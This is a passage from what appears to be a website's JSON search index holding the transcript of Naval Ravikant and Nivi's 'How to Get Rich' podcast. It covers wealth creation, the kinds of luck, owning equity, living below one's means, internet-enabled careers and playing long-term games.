wealth. For example, when journalists attack rich people or the tech industry, they\u2019re really bidding for status. They\u2019re saying, \u201cNo, the people are more important. And I, the journalist, represent the people, and therefore I am more important.\u201d The problem is, to win at a status game you have to put somebody else down. That\u2019s why you should avoid status games in your life\u2014because they make you into an angry combative person. You\u2019re always fighting to put other people down and elevate yourself and the people you like. Status games are always going to exist; there\u2019s no way around it. Realize that most of the time when you\u2019re trying to create wealth, you\u2019re getting attacked by someone else and they\u2019re trying to look like a goody-two shoes. They\u2019re trying to up their own status at your expense. They\u2019re playing a different game. And it\u2019s a worse game. It\u2019s a zero-sum game, instead of a positive-sum game.","title":"Seek Wealth, Not Money or Status"},{"location":"other/How%20to%20Get%20Rich/#make-abundance-for-the-world","text":"Wealth isn\u2019t about taking something from somebody els e Ethical wealth creation makes abundance for the world Naval: I think there is this notion that making money is evil, right? It\u2019s rooted all the way back down to \u201cmoney is the root of all evil.\u201d People think that the bankers steal our money. It\u2019s somewhat true in that, in a lot of the world, there\u2019s a lot of theft going on all the time. The history of the world, in some sense, is this predator/prey relationship between makers and takers. There are people who go out and create things, and build things, and work hard on things. Then there are people who come along with a sword, or a gun, or taxes, or crony capitalism, or Communism, or what have you. There\u2019s all these different methods to steal. Even in nature, there are more parasites than there are non-parasitical organisms. You have a ton of parasites in you, who are living off of you. The better ones are symbiotic, they\u2019re giving something back. But there are a lot that are just taking. That\u2019s the nature of how any complex system is built. What I am focused on is true wealth creation. It\u2019s not about taking money. It\u2019s not about taking something from somebody else. It\u2019s from creating abundance. Obviously, there isn\u2019t a finite number of jobs, or finite amount of wealth. Otherwise we would still be sitting around in caves, figuring out how to divide up pieces of fire wood, and the occasional dead deer. Most of the wealth in civilization, in fact all of it, has been created. It got created from somewhere. It got created from people. It got created from technology. It got created from productivity. It got created from hard work. This idea that it\u2019s stolen is this horrible zero-sum game that people who are trying to gain status play. Everyone can be rich But the reality is everyone can be rich. We can see that by seeing, that in the First World, everyone is basically richer than almost anyone who was alive 200 years ago. 200 years ago nobody had antibiotics. Nobody had cars. Nobody had electricity. Nobody had the iPhone. All of these things are inventions that have made us wealthier as a species. Today, I would rather be a poor person in a First World country, than be a rich person in Louis the XIV\u2019s France. I\u2019d rather be a poor person today than aristocrat back then. That\u2019s because of wealth creation. The engine of technology is science that is applied for the purpose of creating abundance. So, I think fundamentally everybody can be wealthy. This thought experiment I want you to think through is imagine if everybody had the knowledge of a good software engineer and a good hardware engineer. If you could go out there, and you could build robots, and computers, and bridges, and program them. Let\u2019s say every human knew how to do that. What do you think society would look like in 20 years? My guess is what would happen is we would build robots, machines, software and hardware to do everything. We would all be living in massive abundance. We would essentially be retired, in the sense that none of us would have to work for any of the basics. We\u2019d even have robotic nurses. We\u2019d have machine driven hospitals. We\u2019d have self-driving cars. We\u2019d have farms that are 100% automated. We\u2019d have clean energy. At that point, we could use technology breakthroughs to get everything that we wanted. If anyone is still working at that point, they\u2019re working as a form of expressing their creativity. They\u2019re working because it\u2019s in them to contribute, and to build and design things. I don\u2019t think capitalism is evil. Capitalism is actually good. It\u2019s just that it gets hijacked. It gets hijacked by improper pricing of externalities. It gets hijacked by improper yields, where you have corruption, or you have monopolies.","title":"Make Abundance for the World"},{"location":"other/How%20to%20Get%20Rich/#free-markets-are-intrinsic-to-humans","text":"We use credits and debits to cooperate across genetic boundaries Free markets are intrinsic to the human species Naval: Overall capitalism [meaning free markets] is intrinsic to the human species. Capitalism is not something we invented. Capitalism is not even something we discovered. It is in us in every exchange that we have. When you and I exchange information, I want some information back from you. I give you information. You give me information. If we weren\u2019t having a good information exchange, you\u2019d go talk to somebody else. So, the notion of exchange, and keeping track of credits and debits, this is built into us as flexible social animals. We are the only animals in the animal kingdom that cooperate across genetic boundaries. Most animals don\u2019t even cooperate. But when they do, they cooperate only in packs where they co-evolve together, and they share blood, so they have some shared interests. Humans don\u2019t have that. I can cooperate with you guys. One of you is a Serbian. The other one is a Persian by origin. And I\u2019m Indian by origin. We have very little blood in common, basically none. But we still cooperate. What lets us cooperate? It\u2019s because we can keep track of debits and credits. Who put in how much work? Who contributed how much? That\u2019s all free market capitalism is. So, I strongly believe that it is innate to the human species, and we are going to create more and more wealth, and abundance for everybody. Everybody can be wealthy. Everybody can be retired. Everybody can be successful. It is merely a question of education and desire. You have to want it. If you don\u2019t want it, that\u2019s fine. Then you opt out of the game. But don\u2019t try to put down the people who are playing the game. Because that\u2019s the game that keeps you in a comfortable warm bed at night. That\u2019s the game that keeps a roof over your head. That\u2019s the game that keeps your supermarkets stocked. That\u2019s the game that keeps the iPhone buzzing in your pocket. So, it is a beautiful game that is worth playing ethically, rationally, morally, socially for the human race. It\u2019s going to continue to make us all richer and richer, until we have massive wealth creation for anybody who wants it. Too many takers and not enough makers will plunge a society into ruin Nivi: It\u2019s not just individuals secretly despising wealth, right? There are countries, groups, political parties that overtly despise wealth. Or at least seem to. Naval: That\u2019s right. What those countries, political parties, and groups are reduced to is playing the zero-sum game of status. In the process to destroy wealth creation, they drag everybody down to their level. Which is why the U.S. is a very popular country for immigrants because of the American dream. Anyone can come here, be poor, and then work really hard and make money, and get wealthy. But even just make some basic money for their life. Obviously, the definition of wealth is different for different people. A First World citizen\u2019s definition of wealth might be, \u201cOh, I have to make millions of dollars, and I\u2019m completely done.\u201d Whereas to a Third World poor immigrant just entering the country, and we were poor immigrants who came here when I as fairly young, to the United States, wealth may just be a much lower number. It may just be, \u201cI don\u2019t have to work a manual labor job for the rest of my life that I don\u2019t want to work.\u201d But groups that despise it will essentially bring the entire group to that level. If you get too many takers, and not enough makers, society falls apart. You end up with a communist country. Look at Venezuela, right? They were so busy taking, and dividing, and reallocating, that people are literally starving in the streets, and losing kilograms of body weight every year just from sheer starvation. Another way to think about it is imagine an organism that has too many parasites. You need some small number of parasites to stay healthy. You need a lot of symbiotes. All the mitochondria in all of our cells that help us respirate and burn oxygen. These are symbiotes that help us survive. We couldn\u2019t survive without them. But, to me, those are partners in the wealth creation that creates the human body. But if you just were filled with parasites, if you got infected with worms, or a virus, or bacteria that were purely parasitical, you would die. So, any organism can only withstand a small number of parasites. When the parasitic element gets too far out of control, you die. Again I\u2019m talking about ethical wealth creation. I\u2019m not talking about monopolies. I\u2019m not talking about crony capitalism. I\u2019m not talking about mispriced externalities like the environment. I\u2019m talking about free minds, and free markets. Small-scale exchange between humans that\u2019s voluntary, and doesn\u2019t have an outsized impact on others. I think that kind of wealth creation, if a society does not respect it, if the group does not respect it, then society will plunge into ruin, and darkness.","title":"Free Markets Are Intrinsic to Humans"},{"location":"other/How%20to%20Get%20Rich/#making-money-isnt-about-luck","text":"Become the kind of person who makes money Making money isn\u2019t about luck Naval: Obviously, we want to be wealthy, and we want to get there in this lifetime without having to rely on luck. A lot of people think making money is about luck. It\u2019s not. It\u2019s about becoming the kind of person that makes money. I like to think that if I lost all my money and if you drop me on a random street in any English-speaking country, within 5, 10 years I\u2019d be wealthy again. Because it\u2019s a skill set that I\u2019ve developed and I think anyone can develop. In 1,000 parallel universes, you want to be wealthy in 999 of them. You don\u2019t want to be wealthy in the 50 of them where you got lucky. We want to factor luck out of it. There\u2019s four kinds of luck that we\u2019re talking about. This came from a book. Marc Andreessen, wrote a blog post about it. 1. Blind luck The first kind of luck you might say is blind luck. Where I just got lucky because something completely out of my control happened. That\u2019s fortune, that\u2019s fate. 2. Luck from hustling Then there\u2019s luck that comes through persistence, hard work, hustle, motion. Which is when you\u2019re running around creating lots of opportunities, you\u2019re generating a lot of energy, you\u2019re doing a lot of things, lots of things will get stirred up in the dust. It\u2019s almost like mixing a petri dish and seeing what combines. Or mixing a bunch of reagents and seeing what combines. You\u2019re generating enough force and hustle and energy that luck will find you. We, as a group, you could argue, got together because of that. Nenad had put up these great videos online, I saw them on Twitter. In that sense, he generated his own luck by creating videos until people like me keep finding him. 3. Luck from preparation A third way is that you become very good at spotting luck. If you are very skilled in a field, you will notice when a lucky break happens in that field. When other people who aren\u2019t attuned to it won\u2019t notice. So you become sensitive to luck and that\u2019s through skill and knowledge and work. 4. Luck from your unique character Then the last kind of luck is the weirdest, hardest kind. But that\u2019s what we want to talk about. Which is where you build a unique character, a unique brand, a unique mindset, where then luck finds you. For example, let\u2019s say that you\u2019re the best person in the world at deep sea underwater diving. You\u2019re known to take on deep sea underwater dives that nobody else will even attempt to dare. Then, by sheer luck, somebody finds a sunken treasure ship off the coast. They can\u2019t get it. Well, their luck just became your luck, because they\u2019re going to come to you to get that treasure. You\u2019re going to get paid for it. Now, that\u2019s an extreme example. The person who got lucky by finding the treasure chest, that was blind luck. But them coming to you and asking you to extract it and having to give you half, that\u2019s not luck. You created your own luck. You put yourself in a position to be able to capitalize on that luck. Or to attract that luck when nobody else has created that opportunity for themselves. When we talk about \u201cwithout getting lucky,\u201d we want to be deterministic, we don\u2019t want to leave it to chance. In 1,000 parallel universes, you want to be wealthy in 999 of them Nivi: Do you want to elaborate a little bit more on the idea that in a 1,000 parallel universes you want to get rich in 999 of them? I think some people are going to see that and say, \u201cthat sounds impossible, it sounds like it\u2019s too good to be true.\u201d Naval: No, I don\u2019t think it\u2019s impossible. I think that you may have to work a little bit harder at it given your starting circumstances. I started as a poor kid in India, so if I can make it, anybody can, in that sense. Now, obviously, I had all my limbs and I had my mental faculties and I did have an education. There are some prerequisites you can\u2019t get past. But if you\u2019re listening to this video or podcast, you probably have the requisite means at your disposal, which is a functioning body and a functioning mind. And I\u2019ve encountered plenty of bad luck along the way. The first little fortune that I made, I instantly lost in the stock market. The second little fortune that I made, or I should have made, I basically got cheated by my business partners. It\u2019s only the third time around has been a charm. And, even then, it has been in a slow and steady struggle. I haven\u2019t made money in my life in one giant payout. It\u2019s always been a whole bunch of small things piling up. It\u2019s more about consistently creating wealth by creating businesses, including opportunities and creating investments. It hasn\u2019t been a giant one-off thing. Wealth stacks up one chip at a time, not all at once My personal wealth has not been generated by one big year. It stacks up little bit, chips at a time. More options, more businesses, more investments, more things that I can do. Same way that someone like Nenad, illacertus, he\u2019s building his brand online. He\u2019s building videos. It\u2019s not like any one video is going to suddenly shower him with riches overnight. It\u2019s going to be a long lifetime of learning, of reading, of creating that\u2019s going to compound. We\u2019re talking about getting wealthy so you can retire, so you have your freedom. Not retire in the sense that you don\u2019t do anything. But in the sense that you don\u2019t have to be any place you don\u2019t want to be, you don\u2019t have to do anything you don\u2019t want to do, you can wake up when you want, you can sleep when you want, you don\u2019t have a boss. That\u2019s freedom. We\u2019re talking about enough wealth to get to freedom. Especially thanks to the Internet these days, though, opportunities are massively abundant. I, in fact, have too many ways to make money, I don\u2019t have enough time. I have opportunities pouring out of my ears and the thing I keep running out of is time. There\u2019s just so many ways to create wealth, to create products, to create businesses, to create opportunities, and to, as a byproduct, get paid by society that I can\u2019t even handle it all.","title":"Making Money Isn\u2019t About Luck"},{"location":"other/How%20to%20Get%20Rich/#make-luck-your-destiny","text":"Build your character in a way that luck becomes deterministic Nivi: I think it\u2019s pretty interesting that the first three kinds of luck that you described there are very common cliches for them that everybody knows. And then for that last kind of luck that comes to you out of the unique way that you act, there\u2019s no real cliche for it. So, for the first three kinds, there\u2019s \u201cdumb luck,\u201d or \u201cblind luck.\u201d That\u2019s the first kind of luck. The second kind of luck there\u2019s the clich\u00e9 that \u201cfortune favors the bold.\u201d That\u2019s a person who gets lucky just by stirring the pot and acting. The third kind of luck, people say that \u201cchance favors the prepared mind.\u201d But for the fourth kind of luck, there isn\u2019t a common clich\u00e9 out there that matches the unique character of your action, which I think is interesting and perhaps an opportunity and it also shows that people aren\u2019t necessarily taking advantage of that kind of luck the way they should be. Naval: I think also at that point, it starts becoming so deterministic that it stops being luck. So, the definition starts fading from luck to more destiny. So, I would characterize that fourth one as you build your character in a certain way and then your character becomes your destiny. Build your character so opportunity finds you One of the things I think that is important to making money, when you want the kind of reputation that makes people do deals through you. I use the example of like, if you\u2019re a great diver then treasure hunters will come and give you a piece of the treasure for your diving skills. If you\u2019re a trusted, reliable, high-integrity, long-term thinking deal maker, then when other people want to do deals but they don\u2019t know how to do them in a trustworthy manner with strangers, they will literally approach you and give you a cut of the deal or offer you a unique deal just because of the integrity and reputation that you have built up. Warren Buffett, he gets offered deals, and he gets to buy companies, and he gets to buy warrants, and bailout banks and do things that other people can\u2019t do because of his reputation. But of course that\u2019s fragile. It has accountability on the line, it has a strong brand on the line, and as we will talk about later, that comes with accountability attached. But I would say your character, your reputation, these are things that you can build that then will let you take up advantage of opportunities that other people may characterize as lucky but you know that it wasn\u2019t luck. Nivi: You said that this fourth kind of luck is more or less a destiny. There\u2019s a quote from that original book that was in Marc\u2019s blog posts from Benjamin Disraeli, who I think was the former prime minister of the UK. The quote to describe this kind of luck was, \u201cwe make our fortunes and we call them fate.\u201d You have to be a little eccentric to be out on the frontier by yourself There were a couple other interesting things about this kind of luck that were mentioned in the blog post, I think it\u2019ll be good for the listeners to hear about is that, this fourth kind of luck can almost come out of eccentric ways that you do your things and that eccentricity is not necessarily a bad thing in this case. In fact, it\u2019s a good thing. Naval: Yeah, absolutely. Because the world is a very efficient place, so, everyone has dug through all the obvious places to dig and so to find something that\u2019s new and novel and uncovered, it helps to be operating on a frontier. Where right there you have to be a little eccentric to be out on the frontier by yourself, and then you have to be willing to dig deeper than other people do, deeper than seems rational just because you\u2019re interested. Nivi: Yeah, the two quotes that I\u2019ve seen that express this kind of luck in addition to that Benjamin Disraeli one, are this one from Sam Altman where he said, \u201cextreme people get extreme results.\u201d I think that\u2019s pretty nice. And then there\u2019s this other one from Jeffrey Pfeffer, who is a professor at Stanford that, \u201cyou can\u2019t be normal and expect abnormal returns.\u201d I\u2019ve always enjoyed that one too. Naval: Yeah. And one quote that I like which is the exact opposite of that is, \u201cplay stupid games win stupid prizes.\u201d A lot of people spend a lot of their time playing social games like on Twitter where you\u2019re trying to improve your social standing and you basically win stupid social prizes which are worthless. Nivi: I guess the last thing that I have from this blog post is the idea that by pursuing these kinds of luck especially the last one, basically everything but dumb luck, by pursuing them you essentially run out of unluck. So, if you just keep stirring the pot and stirring the pot, that alone you will run out of unluck. Naval: Yeah, or it could just be reversion to the mean. So, then you at least neutralized luck so that it\u2019s your own talents that come into play.","title":"Make Luck Your Destiny"},{"location":"other/How%20to%20Get%20Rich/#you-wont-get-rich-renting-out-your-time","text":"You can\u2019t earn non-linearly when you\u2019re renting out your time You won\u2019t get rich renting out your time Nivi: Next you go into more specific details on how you can actually get rich, and how you can\u2019t get rich. The first point was about how you\u2019re not going to get rich: \u201cYou are not going to get rich renting out your time. You must own equity, a piece of the business to gain your financial freedom.\u201d Naval: This is probably one of the absolute most important points. People seem to think that you can create wealth, and make money through work. And it\u2019s probably not going to work. There are many reasons for that. But the most basic is just that your inputs are very closely tied to your outputs. In almost any salaried job, even at one that\u2019s paying a lot per hour like a lawyer, or a doctor, you\u2019re still putting in the hours, and every hour you get paid. So, what that means is when you\u2019re sleeping, you\u2019re not earning. When you\u2019re retired, you\u2019re not earning. When you\u2019re on vacation, you\u2019re not earning. And you can\u2019t earn non-linearly. If you look at even doctors who get rich, like really rich, it\u2019s because they open a business. They open like a private practice. And that private practice builds a brand, and that brand attracts people. Or they build some kind of a medical device, or a procedure, or a process with an intellectual property. So, essentially you\u2019re working for somebody else, and that person is taking on the risk, and has the accountability, and the intellectual property, and the brand. So, they\u2019re just not gonna pay you enough. They\u2019re gonna pay you the bare minimum that they have to, to get you to do their job. And that can be a high bare minimum, but it\u2019s still not gonna be true wealth where you\u2019re retired. Renting out your time means you\u2019re essentially replaceable And then finally you\u2019re actually just not even creating that much original for society. Like I said, this tweetstorm should have been called \u201cHow to Create Wealth.\u201d It\u2019s just \u201cHow to Get Rich\u201d was a more catchy title. But you\u2019re not creating new things for society. You\u2019re just doing things over and over. And you\u2019re essentially replaceable because you\u2019re now doing a set role. Most set roles can be taught. If they can be taught like in a school, then eventually you\u2019re gonna be competing with someone who\u2019s got more recent knowledge, who\u2019s been taught, and is coming in to replace you. You\u2019re much more likely to be doing a job that can be eventually replaced by a robot, or by an AI. And it doesn\u2019t even have to be wholesale replaced over night. It can be replaced a little bit at a time. And that kind of eats into your wealth creation, and therefore your earning capability. So, fundamentally your inputs are matched to your outputs. You are replaceable, and you\u2019re not being creative. I just don\u2019t think that, that is a way that you can truly make money. You must own equity to gain your financial freedom So everybody who really makes money at some point owns a piece of a product, or a business, or some kind of IP. That can be through stock options, so you can be working at a tech company. That\u2019s a fine way to start. But usually the real wealth is created by starting your own companies, or by even investors. They\u2019re in an investment firm, and they\u2019re buying equity. These are much more the routes to wealth. It doesn\u2019t come through the hours. You want a career where your inputs don\u2019t match your outputs You really just want a job, or a career, or a profession where your inputs don\u2019t match your outputs. If you look at modern society, again this is later in the tweetstorm. Businesses that have high creativity and high leverage tends to be ones where you could do an hour of work, and it can have a huge effect. Or you can do 1,000 hours of work, and it can have no effect. For example, look at software engineering. One great engineer can for example create bitcoin, and create billions of dollars worth of value. And an engineer who is working on the wrong thing, or not quite as good, or just not as creative, or thoughtful, or whatever, can work for an entire a year, and every piece of code they ship ends up not getting used. Customers don\u2019t want it. That is an example of a profession where the input and the outputs are highly disconnected. It\u2019s not based on the number of hours that you put in. Whereas on the extreme other end, if you\u2019re a lumberjack, even the best lumberjack in the world, assuming you\u2019re not working with tools, so the inputs and outputs are clearly connected. You\u2019re just using an ax, or a saw. You know, the best lumberjack in the world may be like 3x better than one of the worst lumberjacks, right? It\u2019s not gonna be a gigantic difference. So, you want to look for professions and careers where the inputs and outputs are highly disconnected. This is another way of saying that you want to look for things that are leveraged. And by leveraged I don\u2019t mean financial leveraged alone, like Wall Street uses, and that has a bad name. I\u2019m just talking about tools. We\u2019re using tools. A computer is a tool that software engineers use. If I\u2019m a lumberjack with bulldozers, and automatic robot axes, and saws, I\u2019m gonna be using tools, and have more leverage than someone who is just using his bare hands, and trying to rip the trees out by the roots. Tools and leverage are what create this disconnection between inputs and outputs. Creativity, so the higher the creativity component of a profession, the more likely it is to have disconnected inputs and outputs. So, I think that if you\u2019re looking at professions where your inputs and your outputs are highly connected, it\u2019s gonna be very, very, hard to create wealth, and make wealth for yourself in that process.","title":"You Won\u2019t Get Rich Renting Out Your Time"},{"location":"other/How%20to%20Get%20Rich/#live-below-your-means-for-freedom","text":"People busy upgrading their lifestyles just can\u2019t fathom this freedom People living below their means have freedom Nivi: Any other big things you should avoid, other than renting out your time? Naval: Yeah, there are two tweets that I put out that are related. The first one I was talking about where someone, like, how your lifestyle has to upgrade, shouldn\u2019t get upgraded too fast. And that one basically said, people who are living far below their means enjoy a freedom that people busy upgrading their lifestyles just can\u2019t fathom. And I think that\u2019s very important, just to not upgrade your lifestyle all the time. To maintain your freedom. And it just gives you freedom of operation. You basically, once you make a little bit of money, you still want to be living like your old self, so that just the worry goes away. So, don\u2019t run out to upgrade that house, and lifestyle, and all that stuff. The most dangerous things are heroin and a monthly salary Let\u2019s say you\u2019re getting paid $1,000 an hour. The problem is, is that when you go into a work lifestyle like that, you don\u2019t just suddenly go from making $20 an hour to making $1,000 an hour. That\u2019s a progression over a long career. And as that happens, one subtle problem is that you upgrade your lifestyle as you make more, and more money. And that upgrading of the lifestyle kind of ups what you consider to be wealth, and you stay in this wage slave trap. So, I forget who said it, maybe it was Nassim Taleb. But he said, \u201cThe most dangerous things are heroin, and a monthly salary.\u201d Right, because they are highly addictive. The way you want to get wealthy is you want to be poor, and working, and working, and working. Ideally, you\u2019ll make your money in discrete lumps And this is for example how the tech industry works. Where you don\u2019t make any money for ten years, and then suddenly at year eleven, you might have a giant payday. Which is by the way one reason why these very high marginal tax rates for the so-called wealthy are flawed because the highest risk-taking, most creative professions you literally lose money for a decade over your life, while you take massive risk, and you bleed, and bleed, and bleed. And then suddenly in year eleven, or year fifteen, you might have one single big payday. But then of course Uncle Sam show up, and basically say, \u201cHey, you know what, you just made a lot money this year. Therefore, you\u2019re rich. Therefore, you\u2019re evil and you\u2019ve got to hand it all over to us.\u201d So, it just destroys those kinds of creative risk taking professions. But ideally you want to make your money in discrete lumps, separated over long periods of time, so that your own lifestyle does not have a chance to adapt quickly, and then you basically say, \u201cOkay, now I\u2019m done. Now I\u2019m retired. Now I\u2019m free. I\u2019m still gonna work because you got to do something with your life, but I\u2019m gonna work on only the things that I want, when I want.\u201d And so you have much more creative expression, and much less about money.","title":"Live Below Your Means for Freedom"},{"location":"other/How%20to%20Get%20Rich/#give-society-what-it-doesnt-know-how-to-get","text":"Society will pay you for creating what it wants and delivering it at scale Give society what it wants, but doesn\u2019t know how to get\u2014at scale Nivi: You\u2019re not gonna get rich renting out your time. But you say that, \u201cyou will get rich by giving society what it wants, but does not yet know how to get at scale.\u201d Naval: That\u2019s right. So, essentially as we talked about before, money is IOUs from society saying, \u201cYou did something good in the past. Now here\u2019s something that we owe you for the future.\u201d And so society will pay you for creating things that it wants. But society doesn\u2019t yet know how to create those things because if it did, they wouldn\u2019t need you. They would already be stamped out big time. Almost everything that\u2019s in your house, in your workplace, and on the street used to be technology at one point in time. There was a time when oil was a technology, that made J.D. Rockefeller rich. There was a time when cars were technology, that made Henry Ford rich. So, technology is just the set of things, as Alan Kay said, that don\u2019t quite work yet [correction: Danny Hillis]. Once something works, it\u2019s no longer technology. So, society always wants new things. Figure out what product you can provide and then figure out how to scale it And if you want to be wealthy, you want to figure out which one of those things you can provide for society, that it does not yet know how to get, but it will want, that\u2019s natural to you, and within your skillset, within your capabilities. And then you have to figure out how to scale it. Because if you just build one of it, that\u2019s not enough. You\u2019ve got to build thousands, or hundreds of thousands, or millions, or billions of them. So, everybody can have one. Steve Jobs, and his team of course figured out that society would want smartphones. A computer in their pocket that had all the phone capability times 100, and be easy to use. So, they figured out how to build that, and then they figured out how to scale it. And they figured out how to get one into every First World citizen\u2019s pocket, and eventually every Third World citizen too. And so because of that they\u2019re handsomely rewarded, and Apple is the most valuable company in the world. Nivi: The way I tried to put it was that the entrepreneur\u2019s job is to try to bring the high end to the mass market. Naval: It starts as high end. First it starts as an act of creativity. First you create it just because you want it. You want it, and you know how to build it, and you need it. And so you build it for yourself. Then you figure out how to get it to other people. And then for a little while rich people have it. Like, for example rich people had chauffeurs, and then they had black town cars. And then Uber came along, and everyone\u2019s private driver is available to everybody. And now you can even see Uber pools that are replacing shuttle buses because it\u2019s more convenient. And then you get scooters, which are even further down market of that. So, you\u2019re right. It\u2019s about distributing what rich people used to have to everybody. But the entrepreneur\u2019s job starts even before that, which is creation. Entrepreneurship is essentially an act of creating something new from scratch. Predicting that society will want it, and then figuring out how to scale it, and get it to everybody in a profitable way, in a self-sustaining way.","title":"Give Society What It Doesn\u2019t Know How to Get"},{"location":"other/How%20to%20Get%20Rich/#the-internet-has-massively-broadened-career-possibilities","text":"The Internet allows you to scale any niche obsession The Internet has massively broadened the possible space of careers Nivi: Let\u2019s look at this next tweet, which I thought was cryptic, and also super interesting, about the kind of job or career that you might have. You said, \u201cThe internet has massively broadened the possible space of careers. Most people haven\u2019t figured this out yet.\u201d Naval: The fundamental property of the internet more than any other single thing is it connects every human to each other human on the planet. You can now reach everyone. Whether it\u2019s by emailing them personally, whether it\u2019s by broadcasting to them on Twitter, whether it\u2019s by posting something on Facebook that they find, whether it\u2019s by putting up a website they come and access. It connects everyone to everyone. So, the internet is an inter-networking tool. It connects everybody. That is its superpower. So, you want to use that. What that helps you figure out is the internet means you can find your audience for your product, or your talent, and skill no matter how far away they are. For example, Nenad, who is Illacertus , if you look at his videos pre-internet, how would he get the message out there? It would just be \u2026 what would he do? He would run around where he lives in his neighborhood showing it to people on a computer, or a screen? Or he would try to get it played at his local movie theater? It was impossible. It only works because he can put it on the internet. And then how many people in the world are really interested in it? Or even in interested in what we\u2019re talking about are really gonna absorb it, right? It\u2019s gonna be a very small subset of humanity. The key is being able to reach them. The Internet allows you to scale any niche obsession So, what the internet does is allows any niche obsession, which could be just the weirdest thing. It could be like people who collect snakes, to like people who like to ride hot air balloons, to people who like to sail around the world by themselves, just one person on a craft, or someone who\u2019s obsessed with miniature cooking. Like, there\u2019s this whole Japanese miniature cooking phenomenon. Or there\u2019s a show about a woman who goes in people\u2019s houses, and tidies it up, right? So, whatever niche obsession you have, the internet allows you to scale. Now that\u2019s not to say that what you build will be the next Facebook, or reach billions of users, but if you just want to reach 50,000 passionate people like you, there\u2019s an audience out there for you. So the beauty of this is that we have 7 billion human beings on the planet. The combinatorics of human DNA are incredible. Everyone is completely different. You\u2019ll never meet any two people who are even vaguely similar to each other, that can substitute for each other. It\u2019s not like you can say, \u201cWell, Nivi, just left my life. So, I can have this other person come in, and he\u2019s just like Nivi. And I get the same feelings, and the same responses, and the same ideas.\u201d No. There are no substitutes for people. People are completely unique. So, given that each person has different skillsets, different interests, different obsessions. And it\u2019s that diversity that becomes a creative superpower. So, each person can be creatively superb at their own unique thing. But before that didn\u2019t matter. Because if you were living in a little fishing village in Italy, like your fishing village didn\u2019t necessarily need your completely unique skill, and you had to conform to just the few jobs that were available. But now today you can be completely unique. You can go out on the internet, and you can find your audience. And you can build a business, and create a product, and build wealth, and make people happy just uniquely expressing yourself through the internet. The space of careers has been so broadened. E-sports players, you know, people making millions of dollars playing Fortnite. People creating videos, and uploading them. YouTube broadcasters. Bloggers, podcasters. Joe Rogan, I read, true or false, I don\u2019t know, but I read that he\u2019s gonna make about $100 million a year on his podcast. And he\u2019s had 2 billion downloads. Even PewDiePie\u2026 there\u2019s a hilarious tweet that I retweeted the other day. PewDiePie is the number one trusted name in news. This is a kid I think in Sweden, and he\u2019s got three times the distribution of the top cable news networks. Just on his news channel. It\u2019s not even on his entertainment channel. Escape competition through authenticity The internet enables any niche interest, as long as you\u2019re the best at it to scale out. And the great news is because every human is different, everyone is the best at something. Being themselves. Another tweet I had that is worth kind of weaving in, but didn\u2019t go into this tweetstorm, was a very simple one. I like things when I can compress them down because they\u2019re easy to remember, and easy to hook onto. But that one was, \u201cEscape competition through authenticity.\u201d Basically, when you\u2019re competing with people it\u2019s because you\u2019re copying them. It\u2019s because you\u2019re trying to do the same thing. But every human is different. Don\u2019t copy. I know we\u2019re mimetic creatures, and Ren\u00e9 Girard has a whole mimesis theory. But it\u2019s much easier than that. Don\u2019t imitate. Don\u2019t copy. Just do your own thing. No one can compete with you on being you. It\u2019s that simple. And so the more authentic you are to who you are, and what you love to do, the less competition you\u2019re gonna have. So, you can escape competition through authenticity when you realize that no one can compete with you on being you. And normally that would have been useless advice pre-internet. Post-internet you can turn that into a career.","title":"The Internet Has Massively Broadened Career Possibilities"},{"location":"other/How%20to%20Get%20Rich/#play-long-term-games-with-long-term-people","text":"All returns in life come from compound interest in long-term games Play long-term games with long-term people Nivi: Talk a little bit about what industries you should think about working in. What kind of job you should have? And who you might want to work with? So, you said, \u201cOne should pick an industry where you can play long-term games with long-term people.\u201d Why? Naval: Yeah, this is an insight into what makes Silicon Valley work, and what makes high trust societies work. Essentially, all the benefits in life come from compound interests. Whether it\u2019s in relationships, or making money, or in learning. So, compound interest is a marvelous force, where if you start out with 1x what you have, and then if you increase 20% a year for 30 years, it\u2019s not that you got 30 years times 20% added on. It was compounding, so it just grew, and grew, and grew until you suddenly got a massive amount of whatever it is. Whether it\u2019s goodwill, or love, or relationships, or money. So, I think compound interest is a very important force. You have to be able to play a long-term game. And long-term games are good not just for compound interest, they\u2019re also good for trust. If you look at prisoner\u2019s dilemma type games, a solution to prisoner\u2019s dilemma is tit-for-tat, which is I\u2019m just going do to you what you did last time to me, with some forgiveness in case there was a mistake made. But that only works in an iterated prisoner\u2019s dilemma, in another words if we play a game multiple times. So, if you\u2019re in a situation, like for example you\u2019re in Silicon Valley, where people are doing business with each other, and they know each other, they trust each other. Then they do right by each other because they know this person will be around for the next game. Now of course that doesn\u2019t always work because you can make so much money in one move in Silicon Valley, sometimes people betray each other because they\u2019re just like, \u201cI\u2019m going to get rich enough off this that I don\u2019t care.\u201d So, there can be exceptions to all these circumstances. But essentially if you want to be successful, you have to work with other people. And you have to figure out who can you trust, and who can you trust over a long, long period of time, that you can just keep playing the game with them, so that compound interest, and high trust will make it easier to play the game, and will let you collect the major rewards, which are usually at the end of the cycle. So, for example, Warren Buffett has done really well as an investor in the U.S. stock market, but the biggest reason he could do that was because the U.S. stock market has been stable, and around, and didn\u2019t get for example seized by the government during a bad administration. Or the U.S. didn\u2019t plunge into some war. The underlying platform didn\u2019t get destroyed. So, in his case, he was playing a longterm game. And the trust came from the U.S. stock market\u2019s stability. When you switch industries, you\u2019re starting over from scratch In Silicon Valley, the trust comes from the network of people in the small geographic area, that you figure out over time who you can work with, and who you can\u2019t. If you keep switching locations, you keep switching groups\u2026 let\u2019s say you started out in the woodworking industry, and you built up a network there. And you\u2019re working hard, you\u2019re trying to build a product in the woodworking industry. And then suddenly another industry comes along that\u2019s adjacent but different, but you don\u2019t really know anybody in it, and you want to dive in, and make money there. If you keep hopping from industry to \u2026 \u201cNo, actually I need to open a line of electric car stations for electric car refueling.\u201d That might make sense. That might be the best opportunity. But every time you reset, every time you wander out of where you built your network, you\u2019re going to be starting from scratch. You\u2019re not going to know who to trust. They\u2019re not going to know to trust you. There are also industries in which people are transient by definition. They\u2019re always coming in and going out. Politics is an example of that, right? In politics new people are being elected. You see in politics that when you have a lot of old-timers, like the Senate, people who have been around for a long time, and they\u2019ve been career politicians. There\u2019s a lot of downside to career politicians like corruption. But an upside is they actually get deals done with each other because they know the other person is going to be in the same position ten years from now, and they\u2019re going to have to keep dealing with them, so they might as well learn how to cooperate. Whereas every time you get a new incoming freshman class in the House of Representatives, which turns over every two years with a big wave election. Nothing gets done because of a lot fighting. \u201cBecause I just got here, I don\u2019t know you, I don\u2019t know if you\u2019re going to be around, why should I work with you rather than just try to do whatever I think is right?\u201d So, it\u2019s important to pick an industry where you can play long-term games, and with 